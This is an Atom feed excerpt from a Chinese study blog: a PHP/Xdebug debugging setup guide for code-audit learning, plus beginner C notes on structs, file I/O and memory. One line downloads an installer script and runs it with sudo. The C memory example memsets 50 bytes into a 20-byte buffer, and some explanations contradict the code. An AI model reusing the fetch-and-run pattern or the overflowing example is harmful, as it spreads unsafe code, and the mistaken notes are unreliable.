    <content type="html"><![CDATA[<h2 id="PHP-代码调试环境搭建"><a href="#PHP-代码调试环境搭建" class="headerlink" title="PHP 代码调试环境搭建"></a>PHP 代码调试环境搭建</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文以记录个人进行人工代码审计学习所使用到的PHP相关的环境的搭建，后面打算开始更新代码审计学习相关文章，有兴趣的老哥可以来关注一下~</p><p>本文将简要介绍PHP运行环境的搭建（包括Windows和Linux）</p><p>以及主要介绍一下<strong>PHP断点调试环境的搭建</strong></p><h3 id="PHP-运行环境的搭建"><a href="#PHP-运行环境的搭建" class="headerlink" title="PHP 运行环境的搭建"></a>PHP 运行环境的搭建</h3><p>现在有一键搭建php运行环境的工具在，所以这里搭建操作很简单，此处简单记录搭建过程</p><h4 id="Windows系统下"><a href="#Windows系统下" class="headerlink" title="Windows系统下"></a>Windows系统下</h4><p>Windows环境我使用的是Windows7版本的虚拟机，创建好虚拟机之后去<code>PHPStudy</code>官网下载Windows安装包，拖到Windows虚拟机里，然后直接安装即可，非常无脑</p><p><img src="image-20200527223443701.png" alt="image-20200527223443701"></p><h4 id="Linux系统下"><a href="#Linux系统下" class="headerlink" title="Linux系统下"></a>Linux系统下</h4><p>Linux环境我使用的是Ubuntu 20.04 LTS版本的虚拟机，创建好虚拟机之后去<code>PHPStudy</code>官网寻找Ubuntu的安装脚本,这里我找好了，如下，直接复制进装好的Ubuntu虚拟机里执行即可，也很无脑</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh https://download.xp.cn/install.sh &amp;&amp; sudo bash install.sh</span><br></pre></td></tr></table></figure><p>安装完会出现如下字样</p><p><img src="image-20200528164930223.png" alt="image-20200528164930223"></p><p>至于如何使用，可以在官网上的文档找到详细说明</p><hr><h3 id="PHP-断点调试环境的搭建"><a href="#PHP-断点调试环境的搭建" class="headerlink" title="PHP 断点调试环境的搭建"></a>PHP 断点调试环境的搭建</h3><h4 id="Windows系统下-1"><a href="#Windows系统下-1" class="headerlink" title="Windows系统下"></a>Windows系统下</h4><h5 id="服务器端配置"><a href="#服务器端配置" class="headerlink" title="服务器端配置"></a>服务器端配置</h5><p>打开windows7虚拟机，打开PHPStudy，开启WANP，创建站点，然后点击管理，php扩展，添加php_xdebug</p><blockquote><p>也可以通过xdebug官网下载：<a href="http://xdebug.org/docs/install" target="_blank" rel="external nofollow noopener noreferrer">http://xdebug.org/docs/install</a></p></blockquote><p><img src="image-20200528184752615.png" alt="image-20200528184752615"></p><p>通过左侧菜单栏找到设置，选择配置文件，编辑php.ini，在php.ini最底下添加如下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Xdebug]</span></span><br><span class="line"><span class="attr">zend_extension</span>=<span class="string">"C:\phpstudy_pro\Extensions\php\php7.3.4nts\ext\php_xdebug.dll"</span> </span><br><span class="line"><span class="attr">xdebug.remote_enable</span>=<span class="number">1</span></span><br><span class="line"><span class="comment">#与remote_connect_back不能同时开启</span></span><br><span class="line"><span class="attr">xdebug.remote_port</span>=<span class="number">9000</span></span><br><span class="line"><span class="attr">xdebug.remote_host</span>=<span class="string">"192.168.2.112"</span></span><br><span class="line"> <span class="comment">#与remote_host不能同时开启</span></span><br><span class="line"><span class="comment">;xdebug.remote_connect_back = 1 </span></span><br><span class="line"><span class="attr">xdebug.remote_handler</span>=<span class="string">"dbgp"</span></span><br><span class="line"><span class="attr">xdebug.idekey</span>=PHPSTORM</span><br></pre></td></tr></table></figure><ul><li><p><code>zend_extension</code>每个人安装xdebug扩展的位置可能不同，按实际情况填写。</p><p>可通过左侧菜单栏找到设置，选择文件位置，点击php，找到扩展的位置</p></li><li><p><code>remote_enable</code> 必须设置为1</p></li><li><p><code>remote_host</code>和<code>remote_port</code>分别填<code>localhost</code>和<code>9001</code>。<code>remote</code>是指<code>IDE端</code>，并非<code>浏览器端</code>或者<code>PHP服务端</code>，注意理解清楚。</p></li><li><p><code>remote_handler</code>只能填<code>dbpg</code>，照填就行。</p></li><li><p><code>idekey</code>是用于进行会话身份标识的，需要与后面IDE端填的保持一致，这里填的是<code>PHPSTORM</code>。</p></li></ul><h5 id="IDE端配置"><a href="#IDE端配置" class="headerlink" title="IDE端配置"></a>IDE端配置</h5><p>太麻烦了，以后再补上吧</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.jianshu.com/p/53a9064cb4e7" target="_blank" rel="external nofollow noopener noreferrer">https://www.jianshu.com/p/53a9064cb4e7</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PHP-代码调试环境搭建&quot;&gt;&lt;a href=&quot;#PHP-代码调试环境搭建&quot; class=&quot;headerlink&quot; title=&quot;PHP 代码调试环境搭建&quot;&gt;&lt;/a&gt;PHP 代码调试环境搭建&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="审计笔记" scheme="http://kn0sky.com/categories/%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言基础08--结构体</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8008--%E7%BB%93%E6%9E%84%E4%BD%93/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8008--%E7%BB%93%E6%9E%84%E4%BD%93/</id>
    <published>2020-05-28T04:40:50.000Z</published>
    <updated>2020-05-28T02:46:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言基础08–结构体-amp-联合体-amp-枚举类型"><a href="#C语言基础08–结构体-amp-联合体-amp-枚举类型" class="headerlink" title="C语言基础08–结构体&amp;联合体&amp;枚举类型"></a>C语言基础08–结构体&amp;联合体&amp;枚举类型</h1><h3 id="结构体的声明："><a href="#结构体的声明：" class="headerlink" title="结构体的声明："></a>结构体的声明：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NPC</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> * Name;</span><br><span class="line"><span class="keyword">int</span> HP;</span><br><span class="line"><span class="keyword">int</span> MP;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NPC</span> <span class="title">xiaoer</span>;</span></span><br><span class="line">xiaoer.Name = <span class="string">"xiaoer"</span>;</span><br><span class="line">xiaoer.HP = <span class="number">100</span>;</span><br><span class="line">xiaoer.MP = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结构体指针"><a href="#结构体指针" class="headerlink" title="结构体指针"></a>结构体指针</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NPC</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> * Name;</span><br><span class="line"><span class="keyword">int</span> HP;</span><br><span class="line"><span class="keyword">int</span> MP;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NPC</span> <span class="title">npcarr</span>[100];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NPC</span> *<span class="title">npcindex</span>;</span><span class="comment">//声明一个结构体指针</span></span><br><span class="line">npcindex = &amp;npcarr[<span class="number">0</span>];</span><br><span class="line">npcindex-&gt;Name = <span class="string">"xiao1"</span>;<span class="comment">//通过指针可以修改内容</span></span><br><span class="line">npcindex++;<span class="comment">//指针每次移动一个结构体的量</span></span><br><span class="line">npcindex-&gt;Name = <span class="string">"xiao222"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结构体参数"><a href="#结构体参数" class="headerlink" title="结构体参数"></a>结构体参数</h3><p>在函数中的应用：作为参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NPC</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> * Name;</span><br><span class="line"><span class="keyword">int</span> HP;</span><br><span class="line"><span class="keyword">int</span> MP;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">outputNPC</span><span class="params">(struct NPC a)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\nHP=%d\nMP=%d"</span>, a.Name, a.HP, a.MP);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">initNPC</span><span class="params">(<span class="keyword">char</span> * name, <span class="keyword">int</span> HP, <span class="keyword">int</span> MP)</span> </span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NPC</span> <span class="title">npc1</span>;</span></span><br><span class="line">npc1.Name = name;</span><br><span class="line">npc1.HP = HP;</span><br><span class="line">npc1.MP = MP;</span><br><span class="line">outputNPC(npc1);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">initNPC(<span class="string">"lihua"</span>, <span class="number">10</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="联合体"><a href="#联合体" class="headerlink" title="联合体"></a>联合体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"main.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> Info &#123;</span><br><span class="line"><span class="keyword">int</span> HP;</span><br><span class="line"><span class="keyword">char</span> PlayerName;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">union</span> Info Myinfo;</span><br><span class="line">Myinfo.PlayerName = <span class="string">'a'</span>;</span><br><span class="line"><span class="comment">//联合体所有成员地址都是一样的</span></span><br><span class="line">Myinfo.HP = <span class="number">1111</span>;</span><br><span class="line"><span class="comment">//多个值初始化之后只显示最后一个值，也就是同时只能使用其中一个成员</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c\n%d\n"</span>, Myinfo.PlayerName, Myinfo.HP);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="枚举类型"><a href="#枚举类型" class="headerlink" title="枚举类型"></a>枚举类型</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"main.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">enum</span> color &#123;red,green,blue&#125;;<span class="comment">//实际是个整数类型</span></span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;flag);</span><br><span class="line"><span class="keyword">switch</span> (flag) &#123;</span><br><span class="line"><span class="keyword">case</span> red:<span class="built_in">printf</span>(<span class="string">"red"</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> green:<span class="built_in">printf</span>(<span class="string">"freen"</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> blue:<span class="built_in">printf</span>(<span class="string">"blue"</span>); <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//用来看的更清晰</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言基础08–结构体-amp-联合体-amp-枚举类型&quot;&gt;&lt;a href=&quot;#C语言基础08–结构体-amp-联合体-amp-枚举类型&quot; class=&quot;headerlink&quot; title=&quot;C语言基础08–结构体&amp;amp;联合体&amp;amp;枚举类型&quot;&gt;&lt;/a&gt;C语
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C语言学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言基础07--文件操作</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8007--%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8007--%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</id>
    <published>2020-05-28T03:40:50.000Z</published>
    <updated>2020-05-28T02:46:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言基础07–文件操作"><a href="#C语言基础07–文件操作" class="headerlink" title="C语言基础07–文件操作"></a>C语言基础07–文件操作</h1><p>fopen模式</p><p><img src="image-20200516181229653.png" alt="image-20200516181229653"></p><p>读取文件：</p><ol><li>声明一个文件指针</li><li>通过fopen打开文件获得文件指针<ol><li>判断文件指针是否为空，为空则打开失败</li></ol></li><li>把文件指针放到文件末尾来获取文件大小</li><li>指针再移动会文件头部</li><li>申请一块缓冲区空间用来存储读取的数据<ol><li>对空间初始化</li></ol></li><li>通过fread获取文件内容和真实大小<ol><li>通过真实大小和刚刚获取的大小进行比较，如果相同则读取成功</li></ol></li><li>读取完毕，通过fclose关掉文件指针</li></ol><p>写文件：</p><ol><li>声明一个文件指针</li><li>通过fopen打开文件获得文件指针</li><li>通过fwrite来写入文件，返回1则写入成功</li><li>关闭文件指针</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//通过移动位于文件头部的指针，可以读取文件任意位置的数据，文件指针移动到末尾处，文件读取完毕</span></span><br><span class="line"><span class="comment">//声明文件指针，FILE类型</span></span><br><span class="line">FILE * pFile;</span><br><span class="line"><span class="comment">//申请一个内存空间存储文件内容，也就是char * 类型字符串</span></span><br><span class="line"><span class="keyword">char</span> * szReadTextBuffer;</span><br><span class="line"><span class="comment">//申请一个变量存储文件尺寸</span></span><br><span class="line"><span class="keyword">int</span> nReadFileSize;</span><br><span class="line"><span class="comment">//获取读取到的文件缓冲区字节数,使用fread会返回真实长度，用来判断读取是否成功</span></span><br><span class="line"><span class="keyword">int</span> nReadRetSize;</span><br><span class="line"></span><br><span class="line"><span class="comment">//fopen 可以用于打开文件，两个参数：文件路径和读取模式</span></span><br><span class="line"><span class="keyword">if</span> ((pFile = fopen(<span class="string">"E:\\123.txt"</span>, <span class="string">"rb"</span>)) == <span class="literal">NULL</span>) &#123;<span class="comment">//读取失败返回NULL</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"文件打开失败"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//通过设置文件指针到文件末尾，可以算出文件大小</span></span><br><span class="line"><span class="comment">//设置文件指针到末尾</span></span><br><span class="line">fseek(pFile, <span class="number">0</span>, SEEK_END);<span class="comment">//fseek用来设置指针位置（文件指针，0，要移动的位置）SEEK_END表示文件末尾（设定好的宏）</span></span><br><span class="line"><span class="comment">//获取文件指针的位置,获取文件大小</span></span><br><span class="line">nReadFileSize = ftell(pFile);</span><br><span class="line"><span class="comment">//文件指针复位</span></span><br><span class="line">rewind(pFile);<span class="comment">//用来恢复到初始位置</span></span><br><span class="line"><span class="comment">//根据文件尺寸声明足够大小的内存空间</span></span><br><span class="line">szReadTextBuffer = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*nReadFileSize + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//判断一下是否申请成功</span></span><br><span class="line"><span class="keyword">if</span> (szReadTextBuffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"failed"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对申请到的空间初始化</span></span><br><span class="line"><span class="built_in">memset</span>(szReadTextBuffer, <span class="number">0</span>, nReadFileSize + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//将依据获取到文件指针的文件内容读取到已经申请好的缓冲区中，并返回真实读取到的长度</span></span><br><span class="line">nReadRetSize = fread(szReadTextBuffer, <span class="number">1</span>, nReadFileSize, pFile);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否读取失败</span></span><br><span class="line"><span class="keyword">if</span> (nReadFileSize != nReadRetSize) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"failed"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, szReadTextBuffer);</span><br><span class="line"></span><br><span class="line">fclose(pFile);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FILE * pFile0;</span><br><span class="line">pFile0 = fopen(<span class="string">"E:\\1234.txt"</span>, <span class="string">"wb"</span>);</span><br><span class="line"><span class="comment">//fwrite作用把字符串写入文件中，第一个是缓冲区指针，第二个是写出单个元素的大小，第三个元素个数，第四个是文件指针</span></span><br><span class="line"><span class="keyword">int</span> s = fwrite(szReadTextBuffer, <span class="built_in">strlen</span>(szReadTextBuffer), <span class="number">1</span>, pFile0);</span><br><span class="line"></span><br><span class="line">fclose(pFile0);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言基础07–文件操作&quot;&gt;&lt;a href=&quot;#C语言基础07–文件操作&quot; class=&quot;headerlink&quot; title=&quot;C语言基础07–文件操作&quot;&gt;&lt;/a&gt;C语言基础07–文件操作&lt;/h1&gt;&lt;p&gt;fopen模式&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;image
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C语言学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言基础06--存储类&amp;内存管理</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8006--%E5%AD%98%E5%82%A8%E7%B1%BB&amp;%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8006--%E5%AD%98%E5%82%A8%E7%B1%BB&amp;%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</id>
    <published>2020-05-28T02:40:50.000Z</published>
    <updated>2020-05-28T02:20:39.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言基础06–存储类-amp-内存管理"><a href="#C语言基础06–存储类-amp-内存管理" class="headerlink" title="C语言基础06–存储类&amp;内存管理"></a>C语言基础06–存储类&amp;内存管理</h1><h3 id="存储类"><a href="#存储类" class="headerlink" title="存储类"></a>存储类</h3><p>C语言有6种存储类，可以按照作用域，链接，存储时期来描述</p><p>存储时期分为两种</p><ul><li>静态存储时期：类似于局部变量</li><li>自动存储时期：类似于全局变量</li></ul><p>存储类除了指针存储类还有5种：</p><ol><li><p>自动存储类</p><p>auto ：生命周期在花括号内</p></li><li><p>寄存器存储类</p><p>register</p></li><li><p>具有外部链接的静态存储类</p><p>extern：生命周期是在整个程序内</p></li><li><p>具有外部链接的静态存储类</p><p>static：生命周期是在文件内</p></li><li><p>空链接的静态存储类</p><p>static</p></li></ol><h3 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> * szstr;  <span class="comment">//没初始化，所以没分配内存</span></span><br><span class="line">szstr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">20</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));<span class="comment">//使用malloc分配内存，50个char类型的大小</span></span><br><span class="line"><span class="built_in">memset</span>(szstr, <span class="number">0</span>, <span class="number">50</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));  <span class="comment">//初始化为0</span></span><br><span class="line"><span class="built_in">free</span>(szstr);  <span class="comment">//释放内存</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言基础06–存储类-amp-内存管理&quot;&gt;&lt;a href=&quot;#C语言基础06–存储类-amp-内存管理&quot; class=&quot;headerlink&quot; title=&quot;C语言基础06–存储类&amp;amp;内存管理&quot;&gt;&lt;/a&gt;C语言基础06–存储类&amp;amp;内存管理&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C语言学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>汇编基础13--间接寻址</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8013--%E9%97%B4%E6%8E%A5%E5%AF%BB%E5%9D%80/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8013--%E9%97%B4%E6%8E%A5%E5%AF%BB%E5%9D%80/</id>
    <published>2020-05-26T02:27:19.000Z</published>
    <updated>2020-05-26T01:05:57.000Z</updated>
    
